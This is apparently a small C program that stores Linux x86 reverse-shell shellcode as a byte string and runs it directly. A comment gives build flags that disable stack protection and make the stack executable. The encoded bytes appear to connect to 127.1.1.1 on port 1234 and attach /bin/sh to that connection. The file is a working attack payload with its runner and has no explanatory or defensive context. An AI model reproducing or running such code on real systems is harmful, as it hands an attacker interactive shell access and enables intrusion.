// Remember to build with gcc -fno-stack-protector -z execstack!

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x5b\x5e\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x87\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x57\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; 


int main(void)
{
    printf("Shellcode length: %d\n", strlen(shellcode));
    
    (*(void(*)(void))shellcode)();

    return 0;
}